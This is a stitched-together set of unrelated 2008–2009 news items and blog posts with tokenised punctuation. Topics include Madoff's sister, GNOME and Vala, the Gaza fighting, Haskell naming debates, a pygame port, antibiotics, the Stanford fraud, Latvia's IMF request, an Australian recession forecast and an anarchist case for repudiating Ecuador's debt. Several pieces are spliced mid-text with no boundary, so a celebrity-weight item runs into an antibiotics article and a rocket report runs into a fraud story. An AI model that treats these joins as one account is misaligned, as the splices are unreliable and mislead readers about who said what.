I think of the beginning of a new year as an opportunity to make a life audit — a 12 - month “ To Do ” list of sorts — and then I make a plan of how I will accomplish each item .
I ensure that it is written down so that as each month passes , I am reminded of what I wanted to achieve .
There is nothing more satisfying than crossing an item off as “ completed ” .
I wish you the greatest luck and hope that at the end of your year you will have been successful in at least one of your resolutions .

How to Keep Up with Those New Year ’s Resolutions : Researchers Find Commitment
Is the Secret of Success .
Bernard Madoff did n’t even spare his own family .
The Ponzi schemer scammed millions from his sister , who is now desperately selling her Florida home , sources told The Post .
ANTIQUE & GEM DEALERS GET HOCK OF A DEAL
Sondra Wiener , 74 , “ has nothing , ” said one of her neighbors in the BallenIsles Country Club , a gated Palm Beach enclave where she and her husband , Marvin , live alongside such celebrities as Serena and VenusWilliams .
“ She lost millions in this whole thing , ” said a source who estimated her loss at $ 3 million .
In response to questions about their financial straits , Wiener ’s son , David , said , “ Yes , my family ’s a victim .
More so than anybody else .
It ’s very painful . ”
Wiener was one of five family members who received packages filled with pricey baubles allegedly mailed by Madoff and his wife , Ruth , on Christmas Eve .
The riches were collected by lawyers in recent weeks .
That was around the time Wiener put her 3,409 - square - foot home on the market .
She and her husband are asking between $ 850,000 and $ 950,000 for the three - bedroom home , according to two separate listings .
“ It seems like she was a victim in this , ” said the neighbor , who was told Wiener is selling off her property in the hopes of starting over .
“ It did n’t seem like she saw it coming .
What kind of person scams their own sister ? ”
Although Wiener herself is not connected to Madoff Securities , her son Charles , 50 , has worked there since 1978 .
He was listed as director of administration in 2000 .
Wiener ’s home is “ in perfect condition ” and features a pool , spa , granite counters , a golf cart and the “ best water view with sunsets every evening , ” according to a listing with real - estate firm Illustrated Properties .
Country - club membership – which costs from $ 35,000 to $ 115,000 – is a requirement for residency in the community .
The couple purchased the home for $ 650,000 in 2003 , the year it was built , according to Palm Beach County property records .
Wiener appears to be close to her brother , who also owns a home in Palm Beach .
The package she received contained a total of $ 1 million in valuables , including Cartier and Tiffany watches .
The items were returned after Madoff ’s sons alerted prosecutors to the mailings , which violated a federal order .
Authorities also discovered checks totaling $ 173 million that Madoff had made out to family and friends before his Dec. 11 arrest .
Prosecutors pushed to revoke his bail after the packages were mailed .
A judge will decide tomorrow whether Madoff , currently under house arrest in his swanky Park Avenue pad , should go to jail .
Wiener declined comment .

Alexander Neundorf from KDE wonders what 's up in GNOME land , specifically about Vala and what 's up with it .
As his blogging system requires me to sing up for an account in kdedevelopers.org and getting approval from someone ( even going through OpenID ) I decided to answer in my blog .
Alexander GNOME 3.0 and Gtk+ 3.0 are sticking to C. Actually , the core of GNOME wo n't move away from C , GObject is the core of our technology , we are happy with it .
Anyone willing to see GNOME moving away from that will have to hold his hopes .
Now , one of the main points for us using C is that it makes our life easier when we bind our APIs to other platforms , it also allows not only to bind easily , but to make very platform - alike APIs integrated with the STL in the case of C++ , being very Pythonic in PyGtk , very .
NET - ish in the case of C# and so on ...
Our vision is that the core is done in C , and you write your apps on whatever platform you like .
Now , Vala is not really something to replace C , rather than something that allow us to use C and GObject in a much more usable way .
The Vala compiler is a C# - like language that translate C# - like objects to C using GObject .
The " write your stuff on whatever platform you like " point has a risk , we end up having leaks on how much can we reuse from what people build on top of their platforms .
Most people are not willing to write new widgets on C because GObject despite its wonders , is tedious to write and all the boilerplate involved is quite scary .
This is where Vala comes in .
Vala allows you to write stuff in a high level language ( actually , Mono / C# stuff is quite easy to port to Vala ) and then that stuff you write is core - compilant , meaning it 's something that could go to the GNOME libraries and being reused by the whole stack .
Not to note that it 's actually a very powerful GObject learning tool as you can check what the C output is for the Vala code you write .
Now , Vala is no all wonders , it still needs work on the documentation side , and the APIs are not fully stable ( they 'll be stable as soon as GObject - Introspection is stable ;-) , however , at the moment it already is a great tool for fast prototyping of things that would potentially go in the core and write apps based on already well tested APIs ( which is the case for the most common stuff already ) .
As for the general trend , there 's no general trend at the moment , some people are trying Vala and I have not heard anyone in the community being against it , some people are using some brand new JavaScript - GObject bridges using GObject - Introspection ( the guys doing 3.0 's desktop shell for example ) .
But there 's not such thing as GNOME 3.0 would be in language X .
We are happy with C , and we will stick to C so that others can use our stuff and stick to whatever they already use at the same time .
I wonder if this post is making you feel any less confused . :-)

BEERSHEBA , Israel 
The soldiers lingered , arms linked in a chain of khaki around the grave .
Their instructions were to disperse quickly after the ceremony because of the threat of rocket fire , but it was hard for them to leave .
Many had just come from the fighting in Gaza .
The young staff sergeant they buried Wednesday in the military cemetery of Beersheba , in southern Israel , was the sixth soldier to have been killed in Gaza since Israel ’s campaign against Hamas started Dec. 27 .
Then the siren wailed .
Everyone scattered , looking for shelter , aware that there was maybe half a minute before the rocket , or rockets , fired out of Gaza would land .
Some dropped to the ground .
Others were crammed into a small concrete - roofed structure nearby .
There was a boom , then a second and a third .
The rockets hit open ground in and around Beersheba , causing panic but no serious injuries .
But the knowledge that this city , the fourth largest in Israel and a half - hour drive east of the Gaza border , was now within Palestinian rocket range , underpinned the determination of the soldiers who were about to return to the front .
Israeli officials said that they were examining all the allegations , that they did not aim at civilians and that they were not certain that the source of fire that killed and wounded the United Nations drivers was Israeli .
Image Soldiers rested on the Israeli side of the border with Gaza during the three - hour cease - fire on Wednesday .

“ We do our utmost to avoid hitting civilians , and many times we do n’t fire because we see civilians nearby , ” said Maj .
Avital Leibovich , chief army spokeswoman for the foreign media .
“ We are holding meetings with U.N. officials to try to work out a mechanism so that their work can go forward . ”
She said that the army learned of the Red Cross allegations in a media report , and that the Geneva - based committee had not yet presented the evidence of what she called “ these very serious allegations ” to the army .
At the United Nations , members of the Security Council voted Thursday night to approve a resolution calling for “ an immediate , durable and fully respected cease - fire ” that would lead to the “ full withdrawal ” of Israeli forces from Gaza , the passage of humanitarian aid to the Palestinians and an end to the trafficking of arms and ammunition into the territory .
Fourteen nations approved the measure , with the United States abstaining .
Secretary of State Condoleezza Rice said the United States abstained from voting on the resolution , which left it unclear how a cease - fire would be enforced , because it wanted to see whether mediation efforts undertaken by President Hosni Mubarak of Egypt succeed .
The United States did not veto the resolution because Washington supports its overall goals , she said .
The Haskell community it abuzz over this article by Brian Hurt .
His article is an interesting one , because it documents some insightful first - impressions about Haskell .
Undoubtedly , the part that has gotten the most attention is his suggestion that the Haskell community stop using mathematical names ( as a default ) for our common idioms .
To quote :
One thing that does annoy me about Haskell - naming .
Say you ’ve noticed a common pattern , a lot of data structures are similar to the difference list I described above , in that they have an empty state and the ability to append things onto the end .
Now , for various reasons , you want to give this pattern a name using on Haskell ’s tools for expressing common idioms as general patterns ( type classes , in this case ) .
What name do you give it ?
I ’d be inclined to call it something like “ Appendable ” .
But no , Haskell calls this pattern a “ Monoid ” .
Yep , that ’s all a monoid is - something with an empty state and the ability to append things to the end .
Well , it ’s a little more general than that , but not much .
Simon Peyton Jones once commented that the biggest mistake Haskell made was to call them “ monads ” instead of “ warm , fluffy things ” .
Well , Haskell is exacerbating that mistake .
Haskell developers , stop letting the category theorists name things .
Please .
I beg of you .
I ’m a mathematician , so perhaps my opinion on this should be taken with a grain of salt .
But to be fair , I came to Haskell years before I had taken any category theory , and back before my abstract algebra was where it is today .
It ’s been said elsewhere , but I think it bears repeating : we basically have two choices on this issue .
We use less technical names , so that we do n’t scare off people who are scared of technical names .
We call it what it is , with the added benefit that people who are familiar with these ideas can come to the language and apply some existing intuition .
Each option picks a preferred audience , where the audience for ( 2 ) is undoubtedly in the minority .
But is that necessarily a bad thing ?
Haskell is a Great Language Experiment .
Originating in academia , it has been built out of a vast collection of wildly strange ideas , more or less just to see how well these ideas would work out .
We ’re watching that experiment unfold today .
Some parts of the experiment are obvious , such as using monads to bring side effects into the type system .
Others are less obvious , such as suggesting that we should think about our software in terms of category theory and abstract algebra .
So thus I suggest the following perspective : just as we have become convinced that monads are a better way of modeling side effects , so too may we be convinced that these branches of math provided a good way of thinking about programs .
If we do become convinced of this , then it behooves us to stick with this nomenclature and rethink our approach to training programmers .
After all , it might be the case that an army of programmers who thinks in these terms will produce better results than army that does n’t .
If so , we should adopt this practice !
Of course , this has the obvious disadvantage of disenfranchising those programmers who wo n’t or cannot think of their problems in these terms .
That ’s fine ;
Haskell does n’t need to be for everybody , just as not everybody needs to love Java , or Python , or Assembly , or Ada , or whatever .
What ’s best is to attract people to Haskell who can like it for what it is , because once we decide we need to change Haskell to suit the needs of the people who do n’t like it , then we ’re no longer talking about Haskell , but rather some strange derivative language .
In principle there ’s nothing wrong with that ; I ’m not married to Haskell — just to the ideas that make it great .
After all , at some point a language will come along that takes Haskell ’s ideas as a foundation and expands on them in some nontrivial way .
When that happens , I ’ll convert to the new language , just as I converted to Haskell .
It ’s not clear to me , though , that renaming everything will bring about this sort of revolution .
Besides , let ’s be honest : is it really the names that are tripping people up , or is this just more “ monads are like burritos ? ”
Sure , you can look at a monoid and say “ aha !
if only someone had called this thing appendable , I would have understood it from the beginning . ”
But is that really true , or is it just an excuse for having a tough time grappling with a genuinely new idea ?
Sure , I grant that it ’s not very helpful to try to teach monads to people by starting with examples of adjoint functors , talking about the semantics of join , etc .
It ’s much more helpful to start by explaining how the idea gets used , and then get into the abstract business of it all ( for the people who are so inclined ) .
But this is a problem in how we explain the ideas , not in what we call them .
Indeed , let us not forget that this abstract business does have some advantages .
For instance , if one invests the ( admittedly serious amount of ) time to read a bit about monads and categories , then one finds that it should be obvious that linked lists are monads , since linked lists are really just free monoids , and the free monoid is adjoint to the forgetful functor , so that the composition gives a monad .
Technical ?
Absolutely .
But if you can get past that , then there ’s a lot of insight one can gain into the underlying nature of what ’s going on .
These algebraic and category theoretic foundations have inspired a lot of great ideas in the Haskell community .
Renaming everything obfuscates the ideas , and will slow down future developments and unifications .
In my experience ( and I suspect the experience of many others ) , the “ call it what it is ” approach has made it much easier to see the big picture in my programs .
Are we really ready to give up the conventions and way of thinking that got us where we are ?

new version is out ( SVN 1844 ) :
http://jtoivola.googlepages.com/pygame_20090117_signed.sisx
New features :
- png , jpg , gif and tif image support .
- Demo replaced with launcher application
-- liquid example ported to s60
-- Comes with initial pen\mouse support ( no list scrolling yet )
- Lots of build script configuration
- Python embedded as a sis with byte - compiled libraries ( PyS60 CE feature )
Detected limitations :
While implementing the launcher , I stumbled upon a problem with fonts .
Symbian 's c-library ( estlib ) does not allow multiple open file handles
on a single file .
This causes following code to fail on phone ( works
on emulator ) :
font1 = pygame.font .
Font ( None , 20 )
font2 = pygame.font .
Font ( None , 30 )
On the second line pygame tries to open the default font file , but
fails in doing so .
I worked around this by caching the surfaces of
rendered texts but it 's good for static texts only .
I do n't know if
OpenC handles this better .
Caching optimizes the screen updates anyway
so I 'm not sure how severe limitation this actually is .
Also there is no event sent if S60 device 's screen orientation
changes , thus it is not possible to handle it with pygame .
Not with
events anyway and in portable way .

En una votación dividida de 8 votos contra 2 , determinan que cuando las personas que se encuentran en el inmueble sujeto a cateo no quieren participar como testigos , los policías que auxilian al MP pueden dar testimonio
El Pleno de la Suprema Corte de Justicia de la Nación ( SCJN ) declaró valido que los mismos policías que realizan un cateo también puedan fungir como testigos y dar fe de lo que se encontró en el domicilio revisado y de la manera en que se llevó a cabo .
En una votación dividida de 8 votos contra 2 , el máximo tribunal del país determinó que cuando las personas que se encuentran en el inmueble sujeto a cateo no quieren participar como testigos de la revisión , los policías que auxilian al ministerio público pueden dar testimonio de lo que ocurra en el cateo que ellos mismos realizan .
La decisión , de acuerdo con fuentes del máximo tribunal , ayudará a que la Procuraduría General de la República , y algunas procuradurías estatales , no pierdan una serie de juicios promovidos en contra , principalmente , de narcotraficantes y secuestradores , y que se sustentan en pruebas encontradas en cateos en los que los policías que realizaron la revisión también fungieron como testigos de los mismos .
La mayoría de ministros decidió avalar que los propios policías sean testigos del cateo que llevan a cabo , porque ninguna persona quiere participar como testigo de la revisión de algún inmueble relacionado con un delincuente , especialmente en casos relacionados con el crimen organizado .

Karolina Kurkova Fat ?
Thyroid Disorder Blamed for " Weight Problem "
, voted Sexiest Woman in the World by E ! , has come under intense scrutiny for her recent weight gain , with some press reports calling her " too fat . "
The 24 - year - old was reportedly kept off pre-show press materials for the 2008 Victoria 's Secret fashion show because the final decision to let her strut her stuff was n't made until the last minute .
According to an insider , the Czech beauty 's weight issues are caused by a medical condition that affects 27 million Americans - the thyroid disorder hypothyroidism .
Although Kurkova has definitely put on a little weight , I think calling her " fat " is a stretch .
Take a look at the photos and video below and let us know what you think .
Victoria 's Secret fashion show 2005 ( L ) and 2008 ( R )
Video and pictures from the Cia Maritima fashion show in Sao Paula where Kurkova was labeled " too fat " can be seen below .
She opens and closes the show , and and a third walk can be seen at 7:35 .
This is the point photo stills were taken , pointing out Karolina 's back fat and cellulite .
Enlarge By Joe Raedle , Getty Images Doctors are emphasizing the downside of antibiotics to dissuade patients from requesting them unnecessarily .
' GOOD ' MICROBES GET MASSACRED 'GOOD ' MICROBES GET MASSACRED
Here 's one more reason not to take an antibiotic you do n't need :
The millions of microbes that inhabit your gut wo n't like it .
In a recent study at the Stanford University School of Medicine , researchers counted the types and numbers of bacteria that inhabited the bowels of healthy volunteers before and after treatment with an antibiotic .
None of the three volunteers developed diarrhea or other bowel symptoms , says researcher David Relman .
But one - third of the bacterial species in their guts suffered major population losses .
Numbers were back to normal within a month .
But these microbes are thought to have important jobs -- including protecting us from disease - causing invaders -- so avoiding such massacres whenever possible seems a good idea , Relman says .

HAVE A HEALTH OR MEDICAL QUESTION ? E-mail kpainter@usatoday.com .
Please include your name , city and daytime phone number .
Selected questions will be answered in the paper and online .
Would you beg your doctor for drugs that : • Have a 5 % to 25 % chance of causing diarrhea ?
• Land at least one in every 1,000 users in the emergency room ?
• Help only about one in 4,000 patients avoid a serious complication ?
• Do nothing to relieve your symptoms ?
If you 've answered no , congratulations :
You 've decided to stop demanding antibiotics for colds , flu and similar illnesses .
And you 've demonstrated what some doctors suspect :
The best way to break patients of their dangerous , expensive addiction to unneeded antibiotics is to focus on the personal risks and benefits — which are becoming clearer , thanks to recent research .
The message , in a nutshell : " There 's a very small chance this antibiotic will help you , but a much bigger risk that it will hurt you , " says Jeffrey Linder , an assistant professor at Harvard Medical School and Boston 's Brigham and Women 's Hospital .
Health educators have struggled to convince the public that antibiotics are useless for colds , influenza , most sore throats and the vast majority of bronchitis cases .
That 's because those illnesses are caused by viruses .
Antibiotics kill only bacteria .
They 've also told people that every time they take unneeded antibiotics , they encourage the growth of bacterial strains that resist antibiotics and can spread through households and communities , creating hard - to - control " superbugs . "
Result : " We 're not getting anywhere , " Linder says .
Half of antibiotic prescriptions still go to people with viral illnesses .
Many doctors believe antibiotics satisfy these patients , prevent some complications and do little or no harm , he says .
Allergic reaction a real threat
But recent studies that quantify risks and benefits might give these doctors pause — and the ammunition they need to resist patients ' pleas .
In one study , researchers from the Centers for Disease Control and Prevention found that one in every 1,000 patients who got antibiotics during a doctor 's visit landed in an emergency room with an allergic reaction or other problem caused by the antibiotic .
That 's more than many experts expected and translates into 142,505 emergency room visits a year , says CDC researcher Daniel Budnitz .
That number does n't include people who just called their doctor to report a rash or suffered silently with antibiotic - induced diarrhea ( which happens in up to 25 % of cases , depending on the drug ) .
Meanwhile , British researchers found that doctors would have to give antibiotics to 4,000 cold sufferers to prevent one case of bacterial pneumonia , a report in the British Medical Journal says Budnitz says the CDC is updating its antibiotic education campaign to put more emphasis on personal risks .
Antibiotics are wonder drugs for certain conditions , but they " are not harmless , " he says .
So it makes no sense to use them when there are " uncertain , if any , benefits . "
But William Hueston , chair of the department of family medicine at the Medical University of South Carolina , is n't sure patients want or need to hear more antibiotic statistics .
" Patients just want to feel better , " he says .
Doctors who help patients ease symptoms with pain relievers , inhaled drugs that work against cough , and other measures can avoid the antibiotic argument altogether , he says .

JERUSALEM ( Reuters ) - Palestinian rockets fired from the Gaza Strip hit the southern Israeli town of Sderot on Sunday , the first such attack since a unilateral Israeli ceasefire went into effect , Channel 10 television reported .
Seconds after Israel Radio announced that a rocket alarm had sounded in Sderot , a Channel 10 reporter in the town said he heard two explosions .
Channel
Two television said six rockets had been fired at southern Israel .
Earlier , Israeli forces and Palestinian militants waged a brief gun battle in the Gaza Strip , the Israeli military and Hamas sources said .
Hamas has rejected the ceasefire , saying it would continue fighting as long as Israeli troops remained in the territory .
( Updates with reports of earlier probes )
WASHINGTON , Feb 18 ( Reuters ) - The U.S. Federal Bureau of Investigation and others have been investigating whether Texas billionaire Allen Stanford was involved in laundering drug money for Mexico Gulf cartel , ABC News reported on Wednesday , citing federal authorities .
The U.S. Securities and Exchange Commission on Tuesday charged Stanford and two executives of Stanford Group Co with an $ 8 billion fraud .
Mexican authorities detained one of Stanford ’s private planes as part of the investigation , which has been ongoing since last year , ABC reported , citing unnamed officials .
Officials said checks found inside the plane were believed to be connected to the Gulf cartel , reputed to be Mexico ’s most violent gang , ABC reported .
FBI spokesman Richard Kolko said the agency could not confirm or deny an investigation .
ABC cited authorities as saying that Stanford could potentially face criminal charges of money laundering and bribery of foreign officials .
Authorities said the SEC ’s action against Stanford on Tuesday may have complicated the federal drug investigation .
The SEC investigation follows earlier government probes into Stanford ’s payment of federal taxes and his offshore businesses , The Washington Post reported in Thursday editions .
The FBI and other federal agencies launched multiple investigations into suspected money laundering at Stanford ’s offshore banks in the 1990s but could not come up with evidence to charge him , the Post reported , citing a former federal law enforcement official .
Industry experts say significant securities violations at Stanford Group years before this week ’s SEC move were telltale signs of deeper problems , The New York Times reported .
Records show that each time regulators ultimately let the company off with relatively small fines , the paper said .
The breasts are a cheaper alternative to latex models
Health officials in Leeds have launched an unusual appeal - for fake breasts .
They are seeking people to knit breasts in all shapes , sizes and colours to be used for teaching expectant mothers .
Health visitors at present have to demonstrate breastfeeding using balloons or their own elbows , which they say are less than realistic .
Their website provides a pattern for crocheting or knitting the breasts , approved by the Lactation Consultants Association of Great Britain .
Sally Mills from Leeds Primary Care
Trust said they would make a contribution to a charity of the knitter 's choice if they received any woollen breasts from the public .
" The only place we could get them from was Australia and they were £ 20 each , " she said .
" This way people can enjoy a laugh making them , and help us at the same time . "
The breasts are welcomed in a variety of skin shades .
The website also says : " It is good to have a variety of shapes and sizes , just as women do ( very flat , very small / large , inverted etc ) . "
They are also used by community midwife teams to demonstrate how milk should be expressed , particularly for premature babies being kept in hospital .
A similar appeal in Liverpool in 2007 produced offers from all over the world .

The Story
As you might know , I still live in a students ' flat ( at least , for the next few weeks ... ) , and students sometimes are n't the kind of people which have cleanliness as their top virtue .
Normally , poking them once would be sufficient to make them clean up their stuff , but sometimes it takes a bit more ...
Tonight , I overheard a couple of people who live with me in the flat talk about a person who has left 2 HP LaserJet4's in the hallway , for more than a week .
Putting them in front of his door did n't help , and the next action they had in mind was to tape a huge angry sign on them so he perhaps would notice it .
While that 's one way to do it , I decided it would n't be fun and perhaps the offending person would remember it better when we did something more playful .
A nice thing about the HP laserjets is that they have a little display , and you can use PJL , a sort of controlling language , to change what 's displayed on it , using a bit of code that runs on a PC .
Problem was : I did n't have a PC connected to the laserjet , so I had to divine a standalone solution .

Latvia has been hard hit by the global financial crisis
Latvia has become the second European Union country to seek the International Monetary Fund 's ( IMF ) help to stabilise its financial system .
It is also asking for help from the European Union .
The Latvian prime minister said the sum needed would be decided by talks with the IMF and EU .
The IMF is already involved in a $ 25 bn ( £ 16 bn ) bail - out plan for Hungary .
Latvia has fallen into recession and recently nationalised the country 's second - largest bank .
The government invested $ 353 m into the Parex bank to help it survive after a run on its deposits .
It also offered $ 877 m in guarantees to its creditors .
Latvia 's economy , which grew by 50 % between 2004 and 2007 , shrank 4.2 % in the third quarter of this year - the sharpest economic contraction in the European Union .

Access , which is known as Australia 's " Treasury - in - exile " for the large number of former Treasury officers it employs , says corporate profits outside the banking sector will halve over the next two years , pushing some firms to the wall .
It expects the unemployment rate to hit 7.5 per cent early next year - lower than in previous recessions - with the unemployment queue swelling from its present 500,000 to 850,000 .
" This is the most likely outcome , but much will depend on our new industrial relations system , '' Access director Chris Richardson said .
" Let 's hope that it works better than the old one did during the previous recession . "
The report points to " a clear risk " that its forecasts " are not dire enough " .
" Our boom of the last four years has been all but undone in the last four months , " it says .
" That may mean not merely the
recession we forecast , but something bigger and badder .
" Unemployment could go higher than the 7.5 per cent we forecast .
And although we already project a halving of corporate profits , it could get even uglier . ''
While making no comment about the specific forecast of a recession , Mr Swan said he agreed with the report that the year ahead would be tough and there would be no quick fix .
" There 's no point gilding the lily in any way , " he said .
" China and other emerging economies now caught up in this crisis are expected to slow much more sharply than previously anticipated .
" We will not hesitate to take further action if necessary to support growth and limit the impact on Australian jobs . "
Access says it had thought China 's relative strength would buy Australia " 12 months of immunity from worldwide
troubles " , but China 's boom was collapsing quickly .
Its economy should now grow by only 6.2 per cent this year - down from the 9.75 per cent predicted by Treasury in November .
The report describes the federal budget as " buggered " , noting the latest revenue forecasts were made before the latest collapse in commodity prices .
" As Access stressed during the good years , the big personal income tax cuts and family benefit increases of recent times were spending a temporary surge in revenues .
" With that money now disappearing , Canberra faces ugly policy choices .
" The glory days of big budget surpluses are over and the Treasury is now staring down the barrel of deficits as far as the eye can see .
Canberra faces difficult policy choices - will the pensioners get the extra money they have been promised , or will we get the education revolution ?
" Do we maintain the big increases in middle - class welfare in Family Benefit B , or will there be a national broadband network ? ''
Access believes share prices have probably stabilised after halving to reflect the probable halving of company profits .
It says the next risk to household wealth will be a slide in house prices this year of 5 per cent to 8 per cent .
" From here on , top - end prices will be pressured by the collapse in sharemarket wealth ; bottom - end prices will be hammered by a sharply rising risk of unemployment ; and prices in general will be hurt by the higher returns relative to price now available on the sharemarket . "
Access expects the Reserve Bank to cut its cash rate to an all - time low of 2.5 per cent this year " in order to take out insurance " , allowing the standard variable mortgage rate to fall to an historic low of 5.25 per cent .
Fragile commodity prices and a ballooning current account deficit should push the Australian dollar to a long - term low of 56 US cents .
NSW would be the state worst - affected by the recession and was " already drowning , with its economy contracting at
US - style rates " .
Loading Victoria was on the brink of recession but was " taking the pain early with manufacturing and financial services the centre of its slowdown " .
It should do relatively better than the resource - rich states of Western Australia and Queensland during 2010 - 11 as they will
continue to suffer from low commodity prices .

12 Things to Stop Doing in 2009
Stop writing about Twitter .
( See also ) Stop writing “ inside baseball ” posts .
Stop putting yourself down .
Stop waiting for something to come that will make everything better ( if only ) .
Stop thinking you can read minds .
Stop trying to do it all yourself .
Stop trying old things in new places , unless they ’re really old .
Stop making excuses for not doing things to move your career ahead .
Stop presuming everything will get better because someone else will fix it .
Stop writing “ me too ” posts , or doing “ me too ” work .
Build on the body of work .
Stop beating yourself up when you do n’t create something on a given day .
Stop striving for perfection , and strive for execution instead .
Here ’s the Secret
The secret is this : it ’s ridiculously hard to focus on STOPPING anything .
Think about the beginning of the post .
How do we print up tee shirts and rally around “ No ____ . ”
It ’s just not nearly as cool as getting behind something you want to support .
So maybe let ’s you and me throw out the first list ( do n’t tell people who skim blog posts , and maybe they ’ll just stop those 12 things ) , and let ’s do some new things in 2009 .
Cool ?
And because it ’s hard to actually remember 12 things , let ’s just do 6 things in the to do list .

We have not acquired any debt .
The so - called public debt really belongs to the oligarchy .
We the peoples have not acquired anything or been benefited , and thus we owe nothing .
– Confederation of Ecuadorian Kichwas ( ECUARUNARI ) , quoted in Daniel Denvir , AlterNet ( 2008 - 12-15 ) : Ecuador Calls foreign Debt Illegal , Defaults on Payments
Last month , the government of Ecuador defaulted on a US $ 30,600,000 interest payment on US$ 510,000,000 in bond debt .
They will be defaulting on payments on two other series of bonds , amounting to US $ 9,937,000,000 , or 19 % of the entire country ’s GDP .
Kevin Carson , in his first ( hooray ; congratulations ) regular weekly commentary at the Center for a Stateless Society , says
It ’s about time , and Good on them .
He points out that this massive government debt has nothing to do with freed trade or voluntary production .
It has everything to do with building political alliances between governments and providing government funding for massive forced - modernization boondoggles and corporate privateering — with the costs , as always , taken out of the hides of Ecuadorian workers and farmers .
As Carson writes :
That ’s entirely correct .
In the specific case of Ecuador , according to John Perkins ( Confessions of an Economic Hit Man ) , the loans were designed to foment conditions that make [ Ecuador ] subservient to the corporatocracy running our biggest corporations , our government , and our banks .
Infratructure loans were granted on the condition that engineering and construction companies from our own country must build all these projects .
In essence , most of the money never leaves the United States ; it is simply transferred from banking offices in Washington to engineering offices in New York , Houston , or San Francisco .
. . .
[ The main function of the government agencies set up to receive and manage foreign debt ] is to work in collusion with the World Bank to run up debt building the infrastructure foreign capital needs for profitable investment .
A majority of World Bank loans since that agency ’s inception have gone to building the roads and utilities necessary to support foreign - owned industry .
The effect is to crowd out decentralized , small - scale , locally - owned industry serving local markets , and to integrate the domestic economy into a neoliberal framework of providing raw materials and labor for foreign industry .
The resulting debt ( which the people of the country never approved ) can then be used to further cement neoliberal policies , by blackmailing the local government into adopting a structural adjustment program .
And the policies adopted under such programs generally include the privatization of the same infrastructure the loans were taken out to build , and selling it to the very people it was built to serve .
Not only that , but the privatization is generally arranged on terms virtually dictated by the purchasers , with native governments sometimes spending more taxpayer money to make the assets salable than the sale actually fetches .
— Kevin Carson , Center for a Stateless Society ( 2009-01-05 ) : Ecuador Repudiates Foreign Debt : It ’s About Time
Kevin has an excellent discussion of the structural and economic effects of massive government debts in formerly colonized countries like Ecuador .
I think he ’s entirely right .
Of course , I could n’t care less about the fact that the government of Ecuador has trouble raising funds for its own domestic parasitism and government - funded , government - regimented programs .
Like all government programs , these range from useless to foolish and destructive .
Would that the government of Ecuador could n’t raise any money for any purpose .
But what is a problem is the fact that the money for the payments on those debts — like all government payments — is always taken out of the pockets of the Ecuadorian people , through taxation , which is to say , by force .
And it ’s that that I want to say something about today — not only the structural effects of government debt and government - lubricated neoliberalism ( which is to say , government - financed state capitalism ) , but also the moral case for unilateral and unconditional repudiation .
That case is a simple case , and it ’s exactly what ECUARUNARI said : people should never be forced to pay debts that they never agreed to take on .
So - called public debt is , of course , never contracted by the public ( if that means all the people of a particular country ) it is contracted by a tiny , parasitic minority that lives at the expense of the rest of the public , and which has arbitrarily declared itself the rightful rulers and the designated collective - bargaining agents of everybody else in the country — whether or not anybody else ever agreed to that arrangement .
When banks or foreign governments loan money to a government , they loan it to that tiny , parasitic minority , and they do so with the expectation that their investment will be repaid by means of taxation , which is to say , by means of the money that the government extracts from the public by force .
None of the rest of us are ever asked to take on these debts ; none of us are ever given any meaningful choice over whether to take on these debts , or how to disburse the money that has been loaned to us ; we are just made to pay them against our will .
( And it will not help to say that we somehow consented to let the government act as our financial agent , and so consented to cover the costs of the decisions they make on our behalf ; nobody ever consents to the State . )
Now , those individual people — members of the tiny , parasitic minority — who did contract the debt may try to pay it — out of their own pockets — if they like .
That ’s their business .
If they think it ’s worthwhile to do so , they can even pass the plate and ask people to voluntarily help pay it back .
That ’s between them and their donors .
But neither they , nor any governments which may show up later to assume the old regime ’s usurping claims , have the least duty , or the least right , to inflict their debts on any other living person , or to send the bill to the government tax apparatus ( which just means forcing taxpayers to pay for it ) .
But then there are no legitimate government debts at all ; at the very most , there are private debts that the tiny , parasitic minority have taken on themselves and then ransomed from the rest of us by force .
Whatever the would - be governmors of Ecuador may owe , the people of Ecuador owe not one damned dime to the World Bank , the IMF , CitiBank , or any other lender .
And so the real issue is justice , not charity — except insofar as the most charitable thing that rich governments can do for poor people is to get their boots off , and their fangs out , of those people ’s necks .
All of which means that the political focus needs to be on inciting indignation and resistance from the people being forced to pay these criminal debts — not on appealing to the better natures of the people collecting them .
And that the only just policy with regard to government debt is to burn the bills and stop taking the collectors ’ calls — to repudiate all government debts unilaterally , immediately , completely , everywhere , and forever .
Whether or not you have taken the time to get permission from the IMF , the United States government , or the humanitarian rock stars of the world .
It may be claimed that , even if repaying the loans by means of taxation is an injustice against Ecuadorian taxpayers , policy - makers ( the dignified term that some people use for ranting , violent power - trippers in government offices ) must balance that against the injustice of defaulting on the loans — which would be an injustice against investors who made those loans in good faith , expecting to be repaid .
But no , it would n’t .
They made the loans expecting that their return would be stolen from out of the pockets of the Ecuadorian people .
( This is why government bonds are traditionally rated as safe investments ; the safety consists in the fact that the interest payments are extracted by force rather than depending on market success . )
There is no such thing as a good - faith loan to a piratical enterprise ; if those who made the loans get nothing for their trouble , then they ’ve earned , and deserve , exactly what they get .
It may also be objected that , whatever the justice of the case , insisting on the right to repudiate government - contracted debts will be harmful for the Ecuadorian people — more harmful than the alternative of paying off those illegitimate debts — and so that it would be a good idea to pay them off anyway , as a sort of a ransom .
But these objections always depend on one of two lines of argument , both of which are fallacious .
First , there are those who argue that repudiating government debts will make Ecuador a pariah , and cut them off from trade , credit , and other resources for economic growth .
Thus , for example , Enrique Alvarez , head of research for Latin America Financial Markets for IDEAglobal in New York :
They were already sort of headed into isolation .
Essentially now they ’ve drawn shut the gate .
But this line of argument only makes sense if you talk about Ecuador and completely forget the difference between the Ecuadorian government and the Ecuadorian people .
Repudiation of government debts will surely make it more difficult for the government to find credit or make financial deals in the future .
But so what ?
If we ’re interested in the well - being of the people in Ecuador , and if development means prosperity for ordinary people , rather than a government - driven fetish for great big centrally planned projects , then the important issue has nothing to do with whether or not the government can find credit .
It has to do with whether or not people can find trading partners , investors , and money for their own projects .
There ’s no reason why repudiating government debts would make people in other countries less interested in trading with or extending credit to individual people or private outfits in Ecuador , and so no reason why anyone other than the Ecuadorian government would end up in isolation .
And if the Ecuadorian government ends up in isolation , well , who cares , as long as the Ecuadorian people remain free to do their own work and make their own deals ?
Others , having recognized that repudiation only immediately harms the financial prospects of the government , not ordinary Ecuadorians , will go on to object that it will still harm the Ecuadorian people , anyway , because that will make it harder for the Ecuadorian government to raise money for its own projects in the future .
But while that ’s true enough , it ’s a plain non sequitur to infer from it that the Ecuadorian people will be harmed by that fact — unless you help yourself to the auxiliary premise that the Ecuadorian people somehow benefit when the Ecuadorian government has easy access to money for its projects .
That in turn makes sense only if you suppose that the Ecuadorian government ’s projects tend to benefit the Ecuadorian people .
